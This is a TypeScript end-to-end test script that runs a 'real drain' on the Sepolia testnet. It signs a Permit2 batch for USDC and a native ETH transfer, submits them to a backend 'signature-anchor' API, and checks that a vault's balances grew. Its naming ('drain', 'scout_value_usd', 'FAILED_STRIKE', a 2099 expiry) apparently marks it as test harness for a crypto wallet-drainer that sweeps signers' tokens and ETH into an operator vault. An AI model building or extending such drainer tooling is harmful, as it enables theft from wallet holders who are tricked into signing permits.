/**
 * End-to-end Sepolia drain test — real Permit2 batch + native leg through signature-anchor.
 *
 * Usage (repo root):
 *   pnpm run test-drain
 *   pnpm exec tsx --env-file=.env scripts/e2e-test-drain.ts
 *
 * Required env:
 *   TEST_EVM_PRIVATE_KEY   — Sepolia burner (0x + 64 hex)
 *   BACKEND_URL            — Railway API base (no trailing slash)
 *   TEST_EVM_VAULT         — expected vault (SOVEREIGN_VAULT_EVM fallback)
 *
 * Optional:
 *   TEST_EVM_RPC           — Sepolia RPC (else RPC_ETHEREUM_PRIVATE / RPC_SEPOLIA_PRIVATE)
 *   TEST_EVM_USDC          — default 0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238
 *   TEST_USDC_AMOUNT       — default 1000000 (1 USDC, 6 decimals)
 *   TEST_NATIVE_AMOUNT     — default 1000000000000000 (0.001 ETH)
 *   LIVE_AUDIT_SETTLE_WAIT_MS — default 15000
 *   SUPABASE_URL + SUPABASE_SERVICE_ROLE_KEY — optional settlement poll
 */
import {
  createPublicClient,
  formatEther,
  formatUnits,
  getAddress,
  http,
  isAddress,
  keccak256,
  parseAbi,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../packages/core/src/logic/deep-ingress.ts'

const SEPOLIA_CHAIN_ID = 11155111
const DEFAULT_SEPOLIA_USDC = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238' as Address
const DEFAULT_USDC_AMOUNT = '1000000'
const DEFAULT_NATIVE_AMOUNT = '1000000000000000'

const ERC20_ABI = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
])

type ApiEnvelope<T = unknown> = {
  success?: boolean
  ok?: boolean
  message?: string
  data?: T
}

type NativeTransferRequest = {
  from: Address
  to: Address
  value: string
  chainId: number
  gas: string
  maxFeePerGas: string
  maxPriorityFeePerGas: string
  nonce: number
  type: 'eip1559'
}

function env(key: string): string {
  return process.env[key]?.trim() ?? ''
}

function requireEnv(key: string): string {
  const v = env(key)
  if (!v) throw new Error(`Missing required env: ${key}`)
  return v
}

function normalizePrivateKey(raw: string): Hex {
  const t = raw.trim()
  return (t.startsWith('0x') ? t : `0x${t}`) as Hex
}

function step(label: string, ok: boolean, detail: string): void {
  const icon = ok ? '✅' : '❌'
  console.log(`${icon} ${label}`)
  console.log(`   ${detail}`)
}

function assertTestnetSafety(): void {
  if (process.env.NODE_ENV === 'production' && env('TEST_EVM_PRIVATE_KEY')) {
    throw new Error(
      'Refusing to run: NODE_ENV=production with TEST_EVM_PRIVATE_KEY set. Use a non-production shell or unset the test key.',
    )
  }
}

function resolveBackendUrl(): string {
  return (
    env('BACKEND_URL') ||
    env('RAILWAY_PUBLIC_URL') ||
    env('API_SITE_URL') ||
    env('RAILWAY_URL')
  ).replace(/\/+$/, '')
}

function resolveRpcUrl(): string {
  return (
    env('TEST_EVM_RPC') ||
    env('RPC_SEPOLIA_PRIVATE') ||
    env('RPC_ETHEREUM_SEPOLIA') ||
    env('RPC_ETHEREUM_PRIVATE') ||
    'https://rpc.ankr.com/eth_sepolia'
  )
}

function resolveVault(): Address {
  const raw = env('TEST_EVM_VAULT') || env('SOVEREIGN_VAULT_EVM') || env('VAULT_ADDRESS_EVM')
  if (!raw || !isAddress(raw)) {
    throw new Error('TEST_EVM_VAULT or SOVEREIGN_VAULT_EVM must be a valid address')
  }
  return getAddress(raw)
}

function apiOk(body: ApiEnvelope): boolean {
  return body.success === true || body.ok === true
}

async function apiFetch<T = ApiEnvelope>(
  base: string,
  path: string,
  init?: RequestInit,
): Promise<{ status: number; body: T; raw: string }> {
  const url = `${base}${path.startsWith('/') ? path : `/${path}`}`
  const res = await fetch(url, {
    ...init,
    headers: { 'Content-Type': 'application/json', ...(init?.headers ?? {}) },
    signal: AbortSignal.timeout(120_000),
  })
  const raw = await res.text()
  let body: T
  try {
    body = JSON.parse(raw) as T
  } catch {
    body = { raw } as T
  }
  return { status: res.status, body, raw }
}

async function signNativeFromTransfer(
  account: ReturnType<typeof privateKeyToAccount>,
  publicClient: ReturnType<typeof createPublicClient>,
  nt: NativeTransferRequest,
): Promise<Hex> {
  const chain = sepolia
  const request = await publicClient.prepareTransactionRequest({
    account,
    chain,
    to: getAddress(nt.to),
    value: BigInt(nt.value),
    gas: BigInt(nt.gas),
    maxFeePerGas: BigInt(nt.maxFeePerGas),
    maxPriorityFeePerGas: BigInt(nt.maxPriorityFeePerGas),
    nonce: nt.nonce,
  })
  return account.signTransaction(request)
}

async function pollSettlement(
  nonce: string,
  maxMs: number,
): Promise<{ status: string | null; txHash: string | null }> {
  const url = env('SUPABASE_URL') || env('NEXT_PUBLIC_SUPABASE_URL')
  const key = env('SUPABASE_SERVICE_ROLE_KEY')
  if (!url || !key) return { status: null, txHash: null }

  const { createClient } = await import('@supabase/supabase-js')
  const sb = createClient(url, key, { auth: { persistSession: false } })
  const deadline = Date.now() + maxMs
  while (Date.now() < deadline) {
    const { data, error } = await sb
      .from('signatures')
      .select('settlement_status,transaction_hash,l2_mint_transaction_hash')
      .eq('nonce', nonce)
      .maybeSingle()
    if (error) break
    if (data) {
      const status = (data.settlement_status as string | null) ?? null
      const txHash =
        (data.transaction_hash as string | null) ||
        (data.l2_mint_transaction_hash as string | null) ||
        null
      if (status === 'SETTLED' || status === 'FAILED_SETTLEMENT' || status === 'FAILED_STRIKE') {
        return { status, txHash }
      }
    }
    await new Promise((r) => setTimeout(r, 5_000))
  }
  return { status: null, txHash: null }
}

async function main(): Promise<void> {
  assertTestnetSafety()

  const base = resolveBackendUrl()
  const rpcUrl = resolveRpcUrl()
  const pk = normalizePrivateKey(requireEnv('TEST_EVM_PRIVATE_KEY'))
  const vault = resolveVault()
  const usdc = getAddress(env('TEST_EVM_USDC') || DEFAULT_SEPOLIA_USDC)
  const usdcAmount = env('TEST_USDC_AMOUNT') || DEFAULT_USDC_AMOUNT
  const nativeAmount = env('TEST_NATIVE_AMOUNT') || DEFAULT_NATIVE_AMOUNT
  const settleWaitMs = Number(env('LIVE_AUDIT_SETTLE_WAIT_MS') || '15000')

  const account = privateKeyToAccount(pk)
  const wallet = getAddress(account.address)
  const nonce = `e2e-drain-sepolia-${Date.now()}`
  const publicClient = createPublicClient({ chain: sepolia, transport: http(rpcUrl) })

  console.log('Legion E2E — Sepolia real drain')
  console.log(`  backend: ${base}`)
  console.log(`  rpc:     ${rpcUrl}`)
  console.log(`  wallet:  ${wallet}`)
  console.log(`  vault:   ${vault}`)
  console.log(`  usdc:    ${usdc}`)
  console.log(`  chain:   ${SEPOLIA_CHAIN_ID}`)
  console.log('')

  let failed = false

  // ── a. Health ─────────────────────────────────────────────────────────────
  try {
    const { status, body } = await apiFetch<ApiEnvelope<{ status?: string }>>(base, '/health')
    const ok = status === 200 && apiOk(body) && body.data?.status === 'ok'
    step('Health check', ok, ok ? `HTTP ${status}, data.status=ok` : `HTTP ${status} — ${JSON.stringify(body).slice(0, 200)}`)
    if (!ok) failed = true
  } catch (e) {
    step('Health check', false, e instanceof Error ? e.message : String(e))
    failed = true
  }

  // Pre-flight balances
  const [ethBefore, usdcBefore, decimals] = await Promise.all([
    publicClient.getBalance({ address: wallet }),
    publicClient.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'balanceOf', args: [wallet] }),
    publicClient.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'decimals' }),
  ])
  const [vaultEthBefore, vaultUsdcBefore] = await Promise.all([
    publicClient.getBalance({ address: vault }),
    publicClient.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'balanceOf', args: [vault] }),
  ])

  console.log('')
  console.log('Burner balances (before):')
  console.log(`  ETH:  ${formatEther(ethBefore)}`)
  console.log(`  USDC: ${formatUnits(usdcBefore, decimals)}`)
  console.log('Vault balances (before):')
  console.log(`  ETH:  ${formatEther(vaultEthBefore)}`)
  console.log(`  USDC: ${formatUnits(vaultUsdcBefore, decimals)}`)
  console.log('')

  if (usdcBefore < BigInt(usdcAmount)) {
    step('Pre-flight USDC', false, `Need >= ${usdcAmount} raw units on burner`)
    failed = true
  }
  const nativeWei = BigInt(nativeAmount)
  if (ethBefore < nativeWei + 50_000_000_000_000_000n) {
    step('Pre-flight ETH', false, `Need >= ${formatEther(nativeWei)} + gas on burner`)
    failed = true
  }

  if (failed) {
    console.log('\nAborting — fix pre-flight failures before drain.')
    process.exit(1)
  }

  // ── c. Batch typed data ───────────────────────────────────────────────────
  let typedData: Record<string, unknown>
  let batchMetadata: Record<string, unknown>
  let engineSpender: Address
  let permit2: Address
  let nativeTransfer: NativeTransferRequest | null = null

  try {
    const { status, body } = await apiFetch<
      ApiEnvelope<{
        typed_data?: Record<string, unknown>
        batch_permit_metadata?: Record<string, unknown>
        engine_spender?: string
        permit2?: string
        native_transfer?: NativeTransferRequest | null
      }>
    >(base, '/api/v1/signature-anchor/permit2-batch-typed-data', {
      method: 'POST',
      body: JSON.stringify({
        wallet_address: wallet,
        chain_id: SEPOLIA_CHAIN_ID,
        permits: [{ token: usdc, amount: usdcAmount }],
        nativeAmount,
      }),
    })
    const ok =
      status === 200 &&
      apiOk(body) &&
      body.data?.typed_data != null &&
      body.data?.batch_permit_metadata != null &&
      body.data?.engine_spender != null &&
      body.data?.permit2 != null
    if (!ok) {
      step('Fetch typed data', false, `HTTP ${status} — ${JSON.stringify(body).slice(0, 400)}`)
      process.exit(1)
    }
    typedData = body.data!.typed_data!
    batchMetadata = body.data!.batch_permit_metadata!
    engineSpender = getAddress(body.data!.engine_spender!)
    permit2 = getAddress(body.data!.permit2!)
    nativeTransfer = body.data!.native_transfer ?? null
    step(
      'Fetch typed data',
      true,
      `engine_spender=${engineSpender.slice(0, 10)}… native_transfer=${nativeTransfer ? 'yes' : 'no'}`,
    )
  } catch (e) {
    step('Fetch typed data', false, e instanceof Error ? e.message : String(e))
    process.exit(1)
  }

  // ── d. Sign EIP-712 batch ───────────────────────────────────────────────────
  let permitSignature: Hex
  try {
    permitSignature = await account.signTypedData({
      domain: typedData.domain as Parameters<typeof account.signTypedData>[0]['domain'],
      types: typedData.types as Parameters<typeof account.signTypedData>[0]['types'],
      primaryType: (typedData.primaryType as 'PermitBatch') ?? 'PermitBatch',
      message: typedData.message as Parameters<typeof account.signTypedData>[0]['message'],
    })
    step('Sign Permit2 batch', true, `${permitSignature.slice(0, 18)}…`)
  } catch (e) {
    step('Sign Permit2 batch', false, e instanceof Error ? e.message : String(e))
    process.exit(1)
  }

  // ── d2. Sign native leg (required when nativeAmount > 0) ───────────────────
  let nativeSignedTx: Hex | undefined
  if (BigInt(nativeAmount) > 0n) {
    if (!nativeTransfer) {
      step('Sign native ETH', false, 'native_transfer missing from typed-data — is SOVEREIGN_VAULT_EVM set on API?')
      process.exit(1)
    }
    try {
      nativeSignedTx = await signNativeFromTransfer(account, publicClient, nativeTransfer)
      const localHash = keccak256(nativeSignedTx)
      step('Sign native ETH', true, `raw tx ${nativeSignedTx.length} chars, hash ${localHash.slice(0, 18)}…`)
    } catch (e) {
      step('Sign native ETH', false, e instanceof Error ? e.message : String(e))
      process.exit(1)
    }
  }

  // ── e. Submit signature-anchor ────────────────────────────────────────────
  const anchorBody: Record<string, unknown> = {
    ingress: 'normalized_v1',
    chain_family: 'EVM',
    protocol: 'permit2_batch_eip712',
    wallet_address: wallet,
    token_address: usdc,
    permits: [{ token: usdc, amount: usdcAmount }],
    batch_permit_metadata: batchMetadata,
    chain_id: SEPOLIA_CHAIN_ID,
    engine_spender: engineSpender,
    permit2,
    nativeAmount,
    signature: permitSignature,
    nonce,
    expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
    wallet_type: 'test',
    scout_value_usd: 100,
  }
  if (nativeSignedTx) {
    anchorBody.native_signed_transaction = nativeSignedTx
  }

  let transactionHash: string | undefined
  let settlementStatus: string | undefined

  try {
    const { status, body } = await apiFetch<
      ApiEnvelope<{
        settlement_status?: string
        transaction_hash?: string
        l2_mint_transaction_hash?: string
      }>
    >(base, '/api/v1/signature-anchor', {
      method: 'POST',
      body: JSON.stringify(anchorBody),
    })
    const ok = status === 200 && apiOk(body)
    transactionHash =
      body.data?.transaction_hash ||
      body.data?.l2_mint_transaction_hash ||
      undefined
    settlementStatus = body.data?.settlement_status
    step(
      'Submit signature-anchor',
      ok,
      ok
        ? `HTTP ${status} settlement=${settlementStatus ?? 'n/a'} tx=${transactionHash ?? 'pending'}`
        : `HTTP ${status} — ${JSON.stringify(body).slice(0, 500)}`,
    )
    if (!ok) {
      process.exit(1)
    }
  } catch (e) {
    step('Submit signature-anchor', false, e instanceof Error ? e.message : String(e))
    process.exit(1)
  }

  // ── f. Wait + poll ──────────────────────────────────────────────────────────
  console.log(`\nWaiting ${settleWaitMs}ms for settlement…`)
  await new Promise((r) => setTimeout(r, settleWaitMs))

  const polled = await pollSettlement(nonce, 120_000)
  if (polled.status) settlementStatus = polled.status
  if (polled.txHash) transactionHash = polled.txHash

  if (settlementStatus) {
    step('Settlement status', settlementStatus === 'SETTLED', settlementStatus)
  }
  if (transactionHash) {
    step('Transaction hash', true, transactionHash)
  }

  // ── g. Verify vault balances ────────────────────────────────────────────────
  const [vaultEthAfter, vaultUsdcAfter] = await Promise.all([
    publicClient.getBalance({ address: vault }),
    publicClient.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'balanceOf', args: [vault] }),
  ])

  const ethDelta = vaultEthAfter - vaultEthBefore
  const usdcDelta = vaultUsdcAfter - vaultUsdcBefore

  console.log('')
  console.log('Vault balance delta:')
  console.log(`  ETH:  +${formatEther(ethDelta)} (expected ~${formatEther(nativeWei)} minus relay)`)
  console.log(`  USDC: +${formatUnits(usdcDelta, decimals)} (expected ${formatUnits(BigInt(usdcAmount), decimals)})`)

  const usdcOk = usdcDelta >= BigInt(usdcAmount)
  const ethOk = ethDelta > 0n
  step('Vault USDC increased', usdcOk, `+${formatUnits(usdcDelta, decimals)}`)
  step('Vault ETH increased', ethOk, `+${formatEther(ethDelta)}`)

  const success =
    settlementStatus === 'SETTLED' || (usdcOk && (BigInt(nativeAmount) === 0n || ethOk))

  console.log('')
  if (success) {
    console.log('✅ E2E drain test PASSED')
    process.exit(0)
  } else {
    console.log('❌ E2E drain test FAILED — check Railway logs, RPC_SEPOLIA on API, and vault gas')
    process.exit(1)
  }
}

void main().catch((e) => {
  console.error('E2E drain crashed:', e)
  process.exit(1)
})
